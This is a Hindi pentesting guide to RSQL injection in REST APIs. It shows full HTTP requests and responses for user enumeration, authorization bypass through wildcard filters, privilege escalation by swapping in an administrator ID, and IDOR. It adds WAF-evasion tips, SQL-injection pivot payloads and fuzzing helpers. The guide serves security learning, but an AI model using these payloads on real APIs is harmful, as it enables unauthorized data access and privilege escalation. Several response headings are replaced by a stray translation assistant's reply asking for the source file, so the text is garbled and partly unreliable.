# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## RSQL क्या है?
RSQL एक query language है जो RESTful APIs में इनपुट के parameterized filtering के लिए डिज़ाइन की गई है। FIQL (Feed Item Query Language) पर आधारित, जिसे मूल रूप से Mark Nottingham ने Atom feeds को query करने के लिए निर्दिष्ट किया था, RSQL अपनी सादगी और जटिल queries को compact और URI-compliant तरीके से HTTP पर व्यक्त करने की क्षमता के लिए अलग दिखता है। यह REST endpoint searching के लिए एक सामान्य query language के रूप में एक उत्कृष्ट विकल्प बनाता है।

## अवलोकन
RSQL Injection वेब एप्लिकेशन्स में एक vulnerability है जो RESTful APIs में query language के रूप में RSQL का उपयोग करती हैं। यह [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) और [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection) की तरह है; यह vulnerability तब होती है जब RSQL filters ठीक तरह से sanitized नहीं होते, जिससे एक attacker को malicious queries inject करने की अनुमति मिलती है ताकि वह authorization के बिना डेटा को access, modify या delete कर सके।

## यह कैसे काम करता है?
RSQL आपको RESTful APIs में advanced queries बनाने की अनुमति देता है, उदाहरण के लिए:
```bash
/products?filter=price>100;category==electronics
```
यह एक संरचित क्वेरी में अनुवादित होता है जो उन उत्पादों को फ़िल्टर करती है जिनकी कीमत 100 से अधिक और श्रेणी “इलेक्ट्रॉनिक्स” है।

यदि एप्लिकेशन उपयोगकर्ता इनपुट को सही ढंग से मान्य नहीं करता है, तो कोई हमलावर फ़िल्टर में हेरफेर करके अप्रत्याशित क्वेरी चला सकता है, जैसे:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
या Boolean queries या nested subqueries का उपयोग करके संवेदनशील जानकारी निकालने के लिए फायदा उठाया जा सकता है।

## जोखिम
- **Exposure of sensitive data:** एक हमलावर ऐसी जानकारी प्राप्त कर सकता है जो एक्सेस करने के लिए उपलब्ध नहीं होनी चाहिए।
- **Data modification or deletion:** फ़िल्टर इंजेक्शन जिसके चलते डेटाबेस रिकॉर्ड बदल या हटाए जा सकते हैं।
- **Privilege escalation:** फ़िल्टर के जरिए identifiers को बदला जा सकता है जो रोल्स देते हैं, जिससे एप्लिकेशन को धोखा देकर किसी अन्य उपयोगकर्ता के privileges के साथ एक्सेस किया जा सकता है।
- **Evasion of access controls:** सीमित डेटा तक पहुँचने के लिए फ़िल्टर्स में छेड़छाड़।
- **Impersonation or IDOR:** फ़िल्टर्स के माध्यम से उपयोगकर्ताओं के बीच identifiers को बदलना, जिससे बिना सही प्रमाणिकरण के अन्य उपयोगकर्ताओं की जानकारी और संसाधनों तक पहुँच मिल जाए।

## समर्थित RSQL ऑपरेटर
| ऑपरेटर  | विवरण | उदाहरण  |
|:----: |:----: |:------------------:|
| `;` / `and` | लॉजिकल **AND** ऑपरेटर। उन rows को फ़िल्टर करता है जहाँ *दोनों* शर्तें *सत्य* हों | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | लॉजिकल **OR** ऑपरेटर। उन rows को फ़िल्टर करता है जहाँ *कम से कम एक* शर्त *सत्य* हो| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | **equals** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान बिल्कुल *queryValue* के बराबर हों | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | **search** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मानों में *queryValue* शामिल हो | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | **like** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *queryValue* जैसे हों | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | **in** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* में *valueA* या *valueB* हो | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | **exclude** क्वेरी करता है। *myTable* की उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान न तो *valueA* हों न ही *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | *not equals* क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *queryValue* के बराबर नहीं हों | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | **not like** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *queryValue* जैसे न हों | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | **lesser than** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *queryValue* से कम हों | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | **lesser than** या **equal to** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *queryValue* से कम या उसके बराबर हों | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | **greater than** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *queryValue* से अधिक हों | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | **equal to** या **greater than** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *queryValue* के बराबर या उससे अधिक हों | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | **from to** क्वेरी करता है। *myTable* से उन सभी पंक्तियों को लौटाता है जहाँ *columnA* के मान *fromValue* के बराबर या उससे अधिक और *toValue* के बराबर या उससे कम हों | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**नोट**: तालिका [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) और [**rsql-parser**](https://github.com/jirutka/rsql-parser) अनुप्रयोगों की जानकारी पर आधारित है।

#### उदाहरण
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**नोट**: तालिका [**rsql-parser**](https://github.com/jirutka/rsql-parser) अनुप्रयोग की जानकारी पर आधारित है।

## सामान्य फ़िल्टर
ये फ़िल्टर APIs में क्वेरीज को परिष्कृत करने में मदद करते हैं:

| फ़िल्टर | विवरण | उदाहरण |
|--------|------------|---------|
| `filter[users]` | विशिष्ट users द्वारा परिणाम फ़िल्टर करता है | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | स्थिति द्वारा फ़िल्टर करता है (active/inactive, completed, आदि) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | तिथि सीमा के भीतर परिणाम फ़िल्टर करता है | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | category या resource type द्वारा फ़िल्टर करता है | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | अद्वितीय पहचानकर्ता द्वारा फ़िल्टर करता है | `/api/v2/posts?filter[id]=42` |

## सामान्य पैरामीटर
ये पैरामीटर API प्रतिक्रियाओं को अनुकूलित करने में मदद करते हैं:

| पैरामीटर | विवरण | उदाहरण |
|-----------|------------|---------|
| `include` | प्रतिक्रिया में संबंधित resources को शामिल करता है | `/api/v2/orders?include=customer,items` |
| `sort` | परिणामों को ascending या descending क्रम में सॉर्ट करता है | `/api/v2/users?sort=-created_at` |
| `page[size]` | प्रति पृष्ठ परिणामों की संख्या नियंत्रित करता है | `/api/v2/products?page[size]=10` |
| `page[number]` | पृष्ठ संख्या निर्दिष्ट करता है | `/api/v2/products?page[number]=2` |
| `fields[resource]` | प्रतिक्रिया में लौटाए जाने वाले फ़ील्ड्स को परिभाषित करता है | `/api/v2/users?fields[users]=id,name,email` |
| `search` | अधिक लचीला search करता है | `/api/v2/posts?search=technology` |

## सूचना रिसाव और उपयोगकर्ताओं की सूचीकरण
निम्नलिखित अनुरोध एक registration endpoint दिखाता है जो यह जाँचने के लिए email पैरामीटर की आवश्यकता करता है कि किसी दिए गए email के साथ कोई उपयोगकर्ता registered है या नहीं, और डेटाबेस में मौजूद होने के आधार पर true या false लौटाता है:

### Request
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### प्रतिक्रिया
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
हालाँकि `/api/registrations?email=<emailAccount>` अपेक्षित है, RSQL filters का उपयोग करके विशेष operators के माध्यम से उपयोगकर्ता जानकारी को enumerate और/या extract करने का प्रयास करना संभव है:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
कृपया src/pentesting-web/rsql-injection.md की सामग्री यहाँ पेस्ट करें ताकि मैं उसका हिंदी अनुवाद कर सकूँ।
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
यदि एक वैध ईमेल खाते से मिलान होता है, तो एप्लिकेशन सर्वर को प्रत्युत्तर में पारंपरिक *“true”*, *"1"* या किसी और चीज़ की बजाय उपयोगकर्ता की जानकारी लौटाएगा:
### अनुरोध
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the content of src/pentesting-web/rsql-injection.md. Please paste the markdown you want translated to Hindi, and I will translate it while preserving all tags, links, and code.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
इस परिदृश्य में, हम एक बुनियादी भूमिका वाले उपयोगकर्ता से शुरू करते हैं और हमारे पास डेटाबेस में पंजीकृत सभी उपयोगकर्ताओं की सूची तक पहुँचने के लिए विशेषाधिकार प्राप्त अनुमतियाँ (उदा. administrator) नहीं हैं:
### अनुरोध
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the contents of src/pentesting-web/rsql-injection.md. कृपया उस फ़ाइल का Markdown यहाँ पेस्ट करें — मैं इसे हिन्दी में अनुवाद कर दूँगा, सभी कोड, टैग और लिंक अपरिवर्तित रखकर।
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
फिर हम filters और special operators का उपयोग करते हैं जो हमें users की जानकारी प्राप्त करने और access control से बचने का वैकल्पिक तरीका प्रदान करेंगे।
उदाहरण के लिए, उन *users* को filter करें जिनके user *ID* में अक्षर “*a*” शामिल हो:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
कृपया src/pentesting-web/rsql-injection.md की सामग्री यहाँ पेस्ट करें — मैं इसे दिए गए नियमों के अनुसार Markdown/HTML टैग्स को अपरिवर्तित रखते हुए हिंदी में अनुवाद कर दूंगा।
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
ऐसे endpoints मिलने की बहुत संभावना रहती है जो user की role के माध्यम से उनके privileges की जाँच करते हैं। उदाहरण के लिए, हम एक ऐसे user के साथ काम कर रहे हैं जिसके पास कोई privileges नहीं हैं:
### Request
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### प्रतिक्रिया
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
कुछ ऑपरेटरों का उपयोग करके हम व्यवस्थापक उपयोगकर्ताओं की सूची निकाल सकते हैं:
### Request
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
कृपया src/pentesting-web/rsql-injection.md फ़ाइल की सामग्री यहाँ चिपकाएँ — मैं उसी Markdown/HTML संरचना को बनाए रखते हुए अंग्रेज़ी से हिंदी में अनुवाद कर दूँगा।
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
एडमिनिस्ट्रेटर उपयोगकर्ता के identifier का पता चल जाने के बाद, corresponding filter को एडमिनिस्ट्रेटर के identifier से बदलकर या जोड़कर और वही privileges प्राप्त करके privilege escalation को exploit करना संभव होगा:

### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### प्रतिक्रिया
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
`filter` पैरामीटर के उपयोग के अलावा, अन्य पैरामीटर जैसे `include` का उपयोग भी संभव है, जो परिणाम में कुछ विशेष फ़ील्ड शामिल करने की अनुमति देता है (e.g. language, country, password...).

निम्न उदाहरण में हमारे उपयोगकर्ता प्रोफ़ाइल की जानकारी दिखाई गई है:
### अनुरोध
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
फ़िल्टरों के संयोजन का उपयोग प्राधिकरण नियंत्रण को चकमा देने और अन्य उपयोगकर्ताओं की प्रोफ़ाइल तक पहुँच प्राप्त करने के लिए किया जा सकता है:

### अनुरोध
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the contents of src/pentesting-web/rsql-injection.md. कृपया वह Markdown सामग्री यहाँ पेस्ट करें जिसे आप हिंदी में अनुवादित करवाना चाहते हैं।
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## डिटेक्शन & fuzzing quickwins
- RSQL सपोर्ट की जाँच करने के लिए हानिरहित probes भेजें जैसे `?filter=id==test`, `?q==test` या malformed operators `=foo=`; verbose APIs अक्सर parser errors leak करते हैं ("Unknown operator" / "Unknown property").
- कई implementations URL parameters को double-parse करती हैं; naive blocklists और WAFs को bypass करने के लिए `(`, `)`, `*`, `;` को double-encode करके कोशिश करें (उदा., `%2528admin%2529`)।
- Boolean exfil with wildcards: `filter[users]=email==*%@example.com;status==ACTIVE` और response sizes की तुलना करने के लिए लॉजिक को `,` (OR) से flip करें।
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` बिना exact IDs जाने साल के आधार पर जल्दी से enumerate कर देता है।

## Framework-specific abuse (Elide / JPA Specification / JSON:API)
- Elide और कई Spring Data REST projects RSQL को सीधे JPA Criteria में translate करते हैं। जब developers custom operators जोड़ते हैं (उदा., `=ilike=`) और predicates को string concatenation से बनाते हैं बजाय prepared parameters के, तो आप SQLi तक pivot कर सकते हैं (classic payload: `name=ilike='%%' OR 1=1--'`)।
- Elide analytic data store parameterized columns accept करता है; user-controlled analytic params को RSQL filters के साथ combine करना CVE-2022-24827 में SQLi का मूल कारण था। भले ही patched versions सही तरीके से parameterize करें, similar bespoke कोड अक्सर रहता है—ध्यान से खोजें `@JoinFilter`/`@ReadPermission` SpEL expressions जो `${}` contain करते हैं और कोशिश करें inject करने की `';sleep(5);'` या logical tautologies।
- JSON:API backends आमतौर पर दोनों `include` और `filter` expose करते हैं। related resources पर filtering `filter[orders]=customer.email==*admin*` top-level ACLs को bypass कर सकता है क्योंकि relation-level filters ownership checks से पहले execute होते हैं।

## Automation helpers
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` payloads को locally validate करता है और abstract syntax tree दिखाता है—balanced parentheses और custom operators बनाने के लिए उपयोगी।
- **Python quick builder**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- HTTP fuzzer (ffuf, turbo-intruder) के साथ जोड़ें — `=in=` lists के अंदर wildcard positions `*a*`, `*e*`, आदि को दोहराते हुए IDs और emails को तेजी से enumerate करें।

## संदर्भ
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
